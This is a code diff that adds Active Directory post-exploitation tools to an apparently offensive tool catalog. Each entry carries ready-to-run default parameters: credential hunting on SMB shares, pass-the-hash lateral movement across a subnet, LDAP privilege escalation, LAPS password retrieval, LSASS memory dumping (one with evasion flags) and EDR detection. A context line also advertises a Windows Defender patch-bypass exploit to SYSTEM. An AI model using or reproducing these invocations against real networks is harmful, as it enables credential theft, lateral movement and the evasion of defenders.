@@ -174,6 +174,47 @@ TOOL_CATALOG: dict[str, dict] = {
         "default_params": "",
         "desc": "WD 0day patch bypass (CVE-2026-50656) → SYSTEM via Cloud Files+CLFS symlink race + WER QueueReporting task (Win11 25H2 / Server 2025, 100% rate)",
     },
+    # ── Active Directory ──────────────────────────────────────────────────────
+    "Snaffler": {
+        "paths": _win("Snaffler.exe"),
+        "default_params": "-s -o snaffler.log",
+        "desc": "File share credential/secret hunting — finds passwords, keys, configs in SMB shares",
+    },
+    "SharpMapExec": {
+        "paths": _win("SharpMapExec.exe"),
+        "default_params": "ntlm smb --hosts 10.10.10.0/24 --domain CORP --username admin --hash <NT>",
+        "desc": "Mass lateral movement — SMB/WMI/LDAP execution across subnet with credential",
+    },
+    "SharpView": {
+        "paths": _win("SharpView.exe"),
+        "default_params": "Get-DomainUser -SPN",
+        "desc": "PowerView C# port — LDAP/AD object enumeration, ACL/GPO/trust analysis",
+    },
+    "BloodyAD": {
+        "paths": _win("BloodyAD.exe"),
+        "default_params": "--host <DC> -d CORP -u user -p pass get object 'DC=corp,DC=local' --attr ms-DS-MachineAccountQuota",
+        "desc": "AD privilege escalation via LDAP — ACL abuse, shadow creds, RBCD, MachineAccountQuota",
+    },
+    "SharpLAPS": {
+        "paths": _win("SharpLAPS.exe"),
+        "default_params": "/host:<target>",
+        "desc": "LAPS password retrieval from AD — reads ms-Mcs-AdmPwd for target computer",
+    },
+    "SharpDump": {
+        "paths": _win("SharpDump.exe"),
+        "default_params": "",
+        "desc": "LSASS minidump via MiniDumpWriteDump (LSASS PID auto-detected)",
+    },
+    "Nanodump": {
+        "paths": _win("nanodump.exe"),
+        "default_params": "--write C:\\Windows\\Temp\\nd.dmp --fork --snapshot",
+        "desc": "Evasive LSASS dump — fork + snapshot, avoids direct handle to LSASS",
+    },
+    "SharpEDRChecker": {
+        "paths": _win("SharpEDRChecker.exe"),
+        "default_params": "",
+        "desc": "EDR/AV product detection — process, driver, service, directory enumeration",
+    },
 }
 
 
